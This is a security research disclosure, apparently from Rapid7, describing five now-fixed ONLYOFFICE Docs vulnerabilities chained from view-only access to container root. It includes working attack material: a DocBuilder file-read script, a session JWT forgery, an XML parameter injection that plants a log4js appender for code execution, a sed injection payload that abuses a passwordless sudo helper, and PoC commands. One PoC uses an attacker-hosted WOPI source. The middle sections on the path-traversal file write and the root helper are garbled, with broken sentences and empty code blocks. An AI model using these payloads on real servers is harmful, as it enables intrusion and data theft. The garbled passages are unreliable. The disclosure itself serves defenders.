title: From view-only access to container root: five vulnerabilities in ONLYOFFICE Docs (FIXED)
summary: As part of our research into Zimbra Collaboration Suite, Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container.
body_markdown:
## Overview


As part of our


[research into Zimbra Collaboration Suite](https://github.com/jburgess-r7/zimbra-vulnerability-tracker) , Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as


root


inside the official DocumentServer container.


The findings also expose server files and document data that the viewer never displays, even when downloading is disabled.


**CVE**


**Finding**


**CVSS**


[CVE-2026-113627](https://www.cve.org/CVERecord?id=CVE-2026-113627)


DocBuilder native file read and Session JWT forgery


[7.1 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)


[CVE-2026-110385](https://www.cve.org/CVERecord?id=CVE-2026-110385)


DocBuilder SaveFile conversion parameter injection and code execution


[8.7 High](https://www.cve.org/CVERecord?id=CVE-2026-110385)


[CVE-2026-97727](https://www.cve.org/CVERecord?id=CVE-2026-97727)


Complete-save format path traversal and arbitrary file write


[6.5 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)


[CVE-2026-113630](https://www.cve.org/CVERecord?id=CVE-2026-113630)

[7.8 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)


[CVE-2026-113631](https://www.cve.org/CVERecord?id=CVE-2026-113631)


View-only export of non-rendered document data


[6.5 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)


ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The


[changelog](https://github.com/ONLYOFFICE/DocumentServer/blob/v10.0.0/CHANGELOG.md#security) describes the release's security changes.


Proof-of-concept code is available on the accompanying


[Github repository](https://github.com/jburgess-r7/onlyoffice-2026-pocs) .


## Product description


[ONLYOFFICE Docs](https://github.com/ONLYOFFICE/DocumentServer) provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files.


An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving.


Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL.


## Credit


This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at


[Rapid7](https://www.rapid7.com/) . The findings are being disclosed in accordance with


[Rapid7's vulnerability disclosure policy](https://www.rapid7.com/security/disclosure/) .


## Testing setup


Rapid7 tested the official


onlyoffice/documentserver:9.4.0


image with package


onlyoffice-documentserver 9.4.0-129


. DocumentServer ran as the


ds


account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key.


Our analysis of the vendor supplied fixes compares the


v9.4.0.129


and


v10.0.0.169


tags of


[ONLYOFFICE/server](https://github.com/ONLYOFFICE/server/compare/v9.4.0.129...v10.0.0.169) ,


[ONLYOFFICE/core](https://github.com/ONLYOFFICE/core/compare/v9.4.0.129...v10.0.0.169) and


[ONLYOFFICE/document-server-package](https://github.com/ONLYOFFICE/document-server-package/compare/v9.4.0.129...v10.0.0.169) . Rapid7 also performed targeted checks on package


10.0.0-169


. For the


[conditional WOPI test](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.uv0o4zruwf3v) on


9.4.0-129


, Rapid7 enabled only


WOPI_ENABLED=true


and left the shipped WOPI IP filter unchanged at its default allow-all rule.


Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown.


## Impact


View-only document access can lead to command execution as


ds


and then


root


inside the official container. The two


[exploit chains](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.uv0o4zruwf3v) use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry.


Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed.


## Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627)


An attacker with view-only access to a document can use


/docbuilder


to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer.


### Technical analysis


**Prerequisite:**


The attacker needs a valid Editor JWT for any document and access to


/docbuilder


. Target files must be readable by


ds


. The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required.


The default-secret branch in


[getTenantSecret()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/tenantManager.js#L215-L227) contains:


```text
switch (type) {
case commonDefines.c_oAscSecretType.Browser:
case commonDefines.c_oAscSecretType.Inbox:
res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key
break;
// ... other token types omitted ...
}
```


The branch at


\[0\]


selects the same configured signing key for Browser and Inbox tokens.


[builderRequest()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/converterservice.js#L460-L519) passes the request to


[getRequestParams()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L1697-L1742) :


```text
const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation
if (authRes.isDecoded) {
cmd.setWithAuthorization(true);
}
```


At


\[1\]


,


builderRequest()


delegates JWT validation to


getRequestParams()


. That function's query-token branch checks the signature using the Inbox key:


```text
if (tenTokenEnableRequestInbox) {
res.code = constants.VKEY;
let checkJwtRes;
if (res.params.token) {
// [2] Inbox signature check
checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox);
} else {
checkJwtRes = yield checkJwtHeader(ctx, req);
}
// ... remaining validation and decoded-claim handling omitted ...
}
```


A view-only Editor JWT passes the signature check at


\[2\]


because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder.


/docbuilder


treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call


[GetFontBinary()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/embed/NativeControlEmbed.cpp#L61-L99) with a supplied filename:


```text
std::wstring sFile = file->toStringW();
bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/'));
if (bIsFullFilePath)
{
bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check
}


// ... font-map fallback omitted ...


return CJSContext::createUint8Array(sFile); // [4] Return file bytes
```


GetFontBinary()


accepts an existing absolute path at


\[3\]


and returns its bytes at


\[4\]


. Ssani4 previously reported this native file-read behavior in


[DocumentBuilder issue #147](https://github.com/ONLYOFFICE/DocumentBuilder/issues/147) on November 21, 2025. That report explicitly identified


GetFontBinary()


and


ZipFileAsString()


and used a Session JWT obtained from


/downloadas


to authorize


/docbuilder


. ONLYOFFICE closed the issue as fixed in DocumentBuilder


9.2.0


.


Rapid7 reproduced


GetFontBinary()


file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains.


### Exploitation


#### Reading a server file


The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is:


```text
POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream


builder.CreateFile("docx");
var bytes = native.GetFontBinary("/etc/passwd");
if (bytes === null || typeof bytes === "undefined") throw new Error("read failed");
var hex = "";
for (var i = 0; i < bytes.length; i++)
hex += ("0" + bytes[i].toString(16)).slice(-2);
var paragraph = Api.CreateParagraph();
paragraph.AddText("R7FILE:" + hex + ":END");
Api.GetDocument().Push(paragraph);
builder.SaveFile("docx", "stolen.docx");
builder.CloseFile();
```


DocumentServer executes the script as


ds


and returns a URL for


stolen.docx


. The PoC downloads


stolen.docx


, extracts the hex between


R7FILE:


and


:END


from


word/document.xml


, and decodes it to recover the contents of


/etc/passwd


. Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary.


#### Stealing the session signing key


The attacker repeats the same request for


/etc/onlyoffice/documentserver/local.json


. In the tested configuration,


services.CoAuthoring.secret.session.string


contained the Session JWT signing key. If


services.CoAuthoring.secret.session.file


instead names a key file, the attacker reads that file with the same


GetFontBinary()


request.


#### Forging a save credential


The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account:


```text
{
"document": {
"key": "external-document-20260821",
"permissions": {
"download": true,
"print": true
}
},
"editorConfig": {
"user": {
"id": "rapid7-poc",
"index": 1
}
},
"iat": 1787329293,
"exp": 1787329593
}
```


The attacker submits a normal


SAVE_TYPE_PART_START


request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions.


#### PoC


The


[file-read and JWT-forgery PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/editor_token_docbuilder_jwt_forgery.py) uses a view-only Editor JWT to read


/etc/passwd


, steal the Session JWT signing key and verify a forged token for an attacker-chosen document key:


```text
python3 pocs/editor_token_docbuilder_jwt_forgery.py \
--documentserver https://docs.example.test \
--token-file /secure/view-only.jwt \
--read-file /etc/passwd \
--read-output /tmp/stolen-passwd \
--document-key external-document-20260821 \
--output-token /tmp/forged-session.jwt \
--timeout 180
```


Output excerpt:


```text
[+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd
[+] forged session JWT accepted for document key: external-document-20260821 (save key _7717)
[+] forged JWT written to: /tmp/forged-session.jwt
[+] forged JWT (expires at Unix time 1787329593):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww
```


The file recovered to the attacker's machine contained the target's account data:


```text
$ head -n 5 /tmp/stolen-passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```


The JWT printed above was signed with the key recovered from


local.json


. DocumentServer accepted that signature during the normal save-key reservation:


```text
{"status":"ok","data":"_7717"}
```


### Impact


The attacker can steal any file readable by


ds


. On the tested system, this included the Session JWT signing key, allowing the attacker to create credentials with document keys and permissions that were never granted to the original viewer. DocumentServer accepted the forged JWT for a save operation under a new document key. The demonstrated unauthorized save accounts for the low integrity impact in the


[7.1 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) score.


The same editor-JWT authorization failure also allowed a view-only user to supply a private-network URL to


Api.CreateImage()


. DocumentServer fetched the URL and returned a decodable image inside a generated DOCX. This narrower consequence shares the authorization root cause above and is not treated as a separate finding.


### Fix


In 10.0.0-169,


[builderRequest()](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/DocService/sources/converterservice.js#L500-L512) now tells the token validator that this is a DocBuilder request:


```text
-const authRes = yield docsCoServer.getRequestParams(ctx, req);
+authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);
```


With the default settings, the new


[check](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/DocService/sources/jwtService.js#L51-L112) rejects tokens containing document-opening fields such as


editorConfig


and WOPI


fileInfo


, even if their signatures are valid. This blocks reuse of a view-only Editor JWT at


/docbuilder


, as confirmed in the 10.0.0-169 test.


The


[native file-read code](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/embed/NativeControlEmbed.cpp#L81-L119) also checks supplied paths against the font map in server mode. An unknown path falls back to the default font rather than being read as the requested file.


## DocBuilder conversion parameter injection enables code execution (CVE-2026-110385)


A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by


ds


. In the tested release, extracting a log4js appender and runtime configuration into the Data directory causes DocService to load and execute attacker code without a restart.


### Technical analysis


**Prerequisite:**


The attacker needs a request accepted by


/docbuilder


. The destination directory must already exist and be writable by


ds


. Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition.


The DocBuilder text-script dispatcher in


[CDocBuilder::RunTextA()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/docbuilder_p.cpp#L1506-L1521) forwards the optional third


builder.SaveFile()


argument without restricting it to supported conversion options:


```text
const wchar_t* sParams = NULL;
if (nCountParameters > 2)
sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML


// [1] Forward conversion parameters
int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);
```


The third argument at


\[0\]


reaches the private save implementation unchanged at


\[1\]


.


[CDocBuilder_Private::SaveFile()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/docbuilder_p.h#L1057-L1085) XML-encodes its own source and destination paths, but then appends the attacker string as raw XML:


```text
oBuilder.WriteString(L"<?xml version=\"1.0\"
encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>");
oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path
oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>");
oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path
oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>");
oBuilder.WriteString(std::to_wstring(type));


// ... remaining server-generated fields omitted ...


if (!sConvertionParams.empty())
{
oBuilder.WriteString(sConvertionParams); // [4] Append raw XML
}
```


The paths at


\[2\]


and


\[3\]


are XML-encoded, but the raw XML appended at


\[4\]


can introduce duplicate task fields after the server-generated values.


X2T's


[InputParams parser](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/cextracttools.h#L697-L720) processes elements sequentially and replaces an existing value whenever the same name appears again:


```text
else if (_T("m_sFileFrom") == sName)
{
RELEASEOBJECT(m_sFileFrom);
m_sFileFrom = new std::wstring(sValue); // [5] Replace source path
}
else if (_T("m_sFileTo") == sName)
{
RELEASEOBJECT(m_sFileTo);
m_sFileTo = new std::wstring(sValue); // [6] Replace destination path
}
else if (_T("m_nFormatFrom") == sName)
{
RELEASEOBJECT(m_nFormatFrom);
m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format
}
else if (_T("m_nFormatTo") == sName)
{
RELEASEOBJECT(m_nFormatTo);
m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format
}
```


Assignments


\[5\]


–


\[8\]


let later XML elements replace the server-selected paths and formats.


[getConversionDirection()](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/cextracttools.h#L1197-L1206) maps source format


2057


(


AVS_OFFICESTUDIO_FILE_OTHER_ZIP


) and destination format


0


(


AVS_OFFICESTUDIO_FILE_UNKNOWN


) to the directory-extraction operation:


```text
else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom &&
AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo)
eRes = TCD_UNZIPDIR; // [9] Directory extraction mode
```


The extraction mode selected at


\[9\]


reaches


[x2t()'s conversion dispatcher](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/X2tConverter/src/ASCConverters.cpp#L2034-L2042) , which uses both attacker-selected paths without containment validation:


```text
case TCD_UNZIPDIR:
{
result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive
}
break;
```


zip2dir()


at


\[10\]


reads the attacker-selected archive and extracts it into the selected directory writable by


ds


.


Writing DocService's runtime configuration provides a route from this file write to code execution.


[runtimeConfigManager](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/runtimeConfigManager.js#L148-L157) watches the configuration directory and automatically reloads


runtime.json


when it is created or changed, passing its attacker-controlled log options to the logger:


```text
getConfig(operationContext.global)
.then(config => {
logger.configureLogger(config?.log?.options); // [11] Reload logging options
})
```


Those options reach


[configureLogger()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/logger.js#L90-L92) at


\[11\]


; the function merges them with the cached configuration before calling log4js:


```text
function configureLogger(options) {
const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options);
log4js.configure(mergedOptions); // [12] Apply log4js configuration
}
```


The configuration applied at


\[12\]


sets the appender


type


to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader


[passes non-core types to require()](https://github.com/log4js-node/log4js-node/blob/v6.9.1/lib/appenders/index.js#L36-L50) , executing that module in DocService.


### Exploitation


#### Preparing the payload files


To run


id


, the inner ZIP named


r7-NONCE.zip


contains


r7-appender-NONCE.js


:


```text
require("child_process").execFile(
"/bin/sh", ["/var/www/onlyoffice/Data/r7-command-NONCE.sh"]
);
exports.configure = () => () => {};
```


r7-command-NONCE.sh


:


```text
#!/bin/sh
id > /tmp/r7-command-NONCE 2>&1
```


The shell script is a PoC convenience:


[execFile()](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) also supports


/bin/sh


with


\["-c", "id > /tmp/r7-command-NONCE 2>&1"\]


. Keeping the command in a file lets the root-helper chain reuse it without embedding the command body in the sed expression.


And


runtime.json


:


```text
{"log":{"options":{"appenders":{"default":{"type":"/var/www/onlyoffice/Data/r7-appender-NONCE.js"}},"categories":{"default":{"appenders":["default"],"level":"WARN"}}}}}
```


The attacker places that inner ZIP inside a second ZIP and base64-encodes the outer ZIP.


#### Staging the inner ZIP


The attacker submits the outer ZIP in a


/docbuilder


script.


native.SetFilePath()


selects


/tmp


as the native ZIP worker directory, and


native.ZipOpenBase64()


extracts the inner ZIP as


/tmp/nativeZip/r7-NONCE.zip


:


```text
builder.CreateFile("docx");
native.SetFilePath("/tmp/r7-NONCE-placeholder");
native.ZipOpenBase64("BASE64_OUTER_ZIP_CONTAINING_r7-NONCE.zip");
```


#### Extracting outside the job directory


The same request calls


builder.SaveFile()


with duplicate X2T task fields appended as conversion parameters:


```text
builder.SaveFile(
"docx",
"safe.docx",
"<m_sFileFrom>/tmp/nativeZip/r7-NONCE.zip</m_sFileFrom>" +
"<m_sFileTo>/var/www/onlyoffice/Data</m_sFileTo>" +
"<m_nFormatFrom>2057</m_nFormatFrom><m_nFormatTo>0</m_nFormatTo>"
);
builder.CloseFile();
```


DocumentServer accepts the request and extracts all three files with attacker-controlled names and bytes into


/var/www/onlyoffice/Data


as


ds


. Writing


runtime.json


triggers the watcher, which loads


r7-appender-NONCE.js


and executes the command in DocService as


ds


without a restart.


#### PoC


Run the


[DocBuilder PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/docbuilder_savefile_params_rce.py) with a view-only Editor JWT. The example uses


--runtime-absent


because the tested installation had no


runtime.json


:


```text
python3 pocs/docbuilder_savefile_params_rce.py \
--documentserver https://docs.example.test \
--token-file /secure/view-only.jwt \
--command id \
--runtime-absent
```


Output:


```text
uid=101(ds) gid=102(ds) groups=102(ds)
```


### Impact


On the tested release, a user restricted to viewing any document can write files anywhere writable by


ds


and immediately execute arbitrary JavaScript in DocService. CVE-2026-110385 has a published


[CVSS v4.0 score of 8.7 High](https://www.cve.org/CVERecord?id=CVE-2026-110385) .


### Fix


The


[10.0.0-169 SaveFile() implementation](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/docbuilder_p.h#L1174-L1178) filters the supplied conversion parameters before adding them to the X2T task:


```text
-sConvertionParams = std::wstring(params);
+sConvertionParams = RemoveUnsafeX2tParams(std::wstring(params));
```


[RemoveUnsafeX2tParams()](https://github.com/ONLYOFFICE/core/blob/v10.0.0.169/DesktopEditor/doctrenderer/docbuilder_p.h#L954-L985) parses the supplied XML and removes


m_sFileFrom


,


m_sFileTo


and


m_sTempDir


. The submitted payload depends on overriding the first two fields to select its archive and extraction destination. Other conversion parameters remain supported.


## Complete-save format traversal enables arbitrary file write (CVE-2026-97727)


An attacker with a valid save session can place path traversal path segments in the requested output format and create or overwrite any file writable by


ds

### Technical analysis


**Prerequisite:**


The attacker needs a valid document Session JWT. The installation must use filesystem storage, and the destination must be writable by


ds

The Session-token branch of

```text
const doc = checkJwtRes.decoded.document;
// [0] Save permission check
if (!doc.permissions || false !== doc.permissions.download || false !== doc.permissions.print) {
isValidJwt = true;
// ... document and user binding omitted ...
} else {
ctx.logger.warn('Error downloadAs jwt: %s', 'access deny');
}
```

At


\[0\]

download


and


print


are explicitly


false

[commandSave()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L661-L669) appends the request's


format


directly to the filename prefix:

```text
const format = cmd.getFormat() || 'bin';
const completeParts = yield* saveParts(ctx, cmd, 'Editor.' + format); // [1] Requested format suffix
```


The suffix at


\[1\]

[saveParts()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L409-L424) unchanged. That function normalizes the filename only for save types other than


SAVE_TYPE_COMPLETE_ALL

```text
if (SAVE_TYPE_COMPLETE_ALL !== saveType) { // [2] Conditional filename normalization

const saveIndex = parseInt(cmd.getSaveIndex()) || 1; //prevent path traversal
filename = pathModule.basename(filename, ext) + saveIndex + ext;
}
// ... save-key setup omitted ...
const buffer = cmd.getData();
// [3] Storage write
yield storage.putObject(ctx, cmd.getDocId() + cmd.getSaveKey() + '/' + filename, buffer, buffer.length);
```

SAVE_TYPE_COMPLETE_ALL

\[2\]


skips basename normalization, and


\[3\]


writes the resulting path. The filesystem backend


[joins](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/storage/storage-fs.js#L44-L47) and

```text
"id": "ignored",
```

The decoded

```text
"id": "ignored",
"tokenSession": "DOCUMENT_SESSION_JWT",
"saveindex": 1,
"outputformat": 513,
"withoutPassword": true,
```

```text

```

SAVE_TYPE_COMPLETE_ALL

/etc/onlyoffice/rapid7-write.txt


as


ds

#### PoC

```text
[+] reserved save key _5619
```

local.json


and

### Impact


The attacker can create or overwrite any file writable by


ds

runtime.json


into

Unlike the


[9.4.0-129 implementation](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/storage/storage-base.js#L62-L65) , the shared


[getStoragePath()](https://github.com/ONLYOFFICE/server/blob/v10.0.0.169/Common/sources/storage/storage-base.js#L61-L70) in 10.0.0-169 checks the normalized object key before handing it to a storage backend:

```text
-return opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\/g, '/');
```

still constructs a filename from

ds

```text
/usr/bin/documentserver-flush-cache.sh *  # [0] Unrestricted helper arguments


ds ALL=(root) NOPASSWD: DS_ROOT_SCRIPTS  # [1] Passwordless root execution
```

\[0\]

*


permits


ds


to choose every argument supplied to


documentserver-flush-cache.sh


. At


\[1\]


, sudo executes that script as


root


without asking for a password.


[documentserver-flush-cache.sh](https://github.com/ONLYOFFICE/document-server-package/blob/v9.4.0.129/common/documentserver/bin/documentserver-flush-cache.sh.m4#L3-L31) assigns the complete


--hash


argument to


HASH


and interpolates it directly into a sed program:


```text
while [ "$1" != "" ]; do
case $1 in
-h | --hash )
if [ "$2" != "" ]; then
HASH=$2  # [2] Unchecked hash argument
shift
fi
;;
# ... restart option omitted ...
esac
shift
done
API_PATH="/var/www/M4_DS_PREFIX/web-apps/apps/api/documents/api.js"
cp -f ${API_PATH}.tpl ${API_PATH}
```

At


\[2\]

\[3\]

e


flag run as


root

The packaged


api.js.tpl

```text

```


The attacker supplies this


--hash

```text
';id > \/tmp\/r7-root;#'/e;#
```

The interpolation at


\[3\]


/

a


[shell-execution flag](https://www.gnu.org/software/sed/manual/sed.html#The-_0022s_0022-Command) . The final


;#

/g

\[4\]

```text

```

e

/bin/sh

const

/tmp/r7-root

#


comments out the trailing quotes. Because sudo launched the helper as


root

root

;


and


'

to run it as

3.


**Root execution:**


The appender invokes


[Passwordless Maintenance Command Elevates ds to Root](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.vbotkx1odgru) , and the passwordless helper executes the supplied command as


root


.


The


[DocBuilder PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/docbuilder_savefile_params_rce.py) runs this chain with a view-only Editor JWT:


```text
python3 pocs/docbuilder_savefile_params_rce.py \
--documentserver https://docs.example.test \
--token-file /secure/view-only.jwt \
--root \
--command whoami \
--runtime-absent
```


Output:


```text
root
```


One malicious


/docbuilder


request triggers container-root execution. The PoC then makes additional


/docbuilder


requests to retrieve the command output.


The direct SaveFile route also executed a command as


root


using a WOPI-issued Browser JWT, under the enablement, filter and reachability conditions above.


### File-read and traversal chain


This path adds token forgery and a separate file-write stage:


1.


**File read and token forgery:**


[Editor JWT Authorizes Native File Reads and Session JWT Forgery](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.akeybkgzmmyx) uses the accepted editor or WOPI Browser JWT to read the session signing key and forge a save JWT.


2.


**Code execution:**


[Complete-Save Format Traversal Enables Arbitrary File Write](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.2plfqvpw2hza) uses that credential to install the appender, command script, and runtime configuration. DocService loads the appender as


ds


.


3.


**Root execution:**


The appender invokes


[Passwordless Maintenance Command Elevates ds to Root](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.vbotkx1odgru) , which executes the supplied command as


root


.


The Editor-token PoC's


--command


mode installs the three execution files and invokes the root helper. It completed this chain from view-only access, returning


uid=0(root)


.


The


[WOPI PoC](https://github.com/jburgess-r7/onlyoffice-2026-pocs/blob/main/pocs/wopi_docbuilder_jwt_forgery.py) performs this chain without a pre-existing JWT. It writes


runtime.json


last to trigger loading after the appender and command script are in place:


```text
python3 pocs/wopi_docbuilder_jwt_forgery.py \
--documentserver https://docs.example.test \
--public-wopi-src http://attacker.example.test:18084/document/ \
--command whoami \
--runtime-absent
```


Output:


```text
root
```


Under the WOPI conditions above, this chain requires no pre-existing DocumentServer account or token.


## Remediation


Upgrade ONLYOFFICE Document Server to the latest supported release, version 10.0 or later. ONLYOFFICE confirmed that version 10.0 addresses all five findings. See the


[10.0.0 security release notes](https://github.com/ONLYOFFICE/DocumentServer/blob/v10.0.0/CHANGELOG.md#security) and the vendor's


[Community Edition Docker update instructions](https://helpcenter.onlyoffice.com/docs/installation/community/docker/update) .


## Disclosure timeline


-


**August 28, 2026:**


Rapid7 contacted ONLYOFFICE to report the five vulnerabilities under its coordinated disclosure policy.


-


**September 15–17, 2026:**


ONLYOFFICE acknowledged review of the reports and requested additional time to address the findings in an upcoming release.


-


**October 23, 2026:**


ONLYOFFICE confirmed that all five findings were fixed in Document Server 10.0. Rapid7 and ONLYOFFICE agreed on November 16 for public disclosure, allowing users time to update.


-


**November 16, 2026:**


Rapid7 publishes this analysis and the


[accompanying PoCs](https://github.com/jburgess-r7/onlyoffice-2026-pocs) .
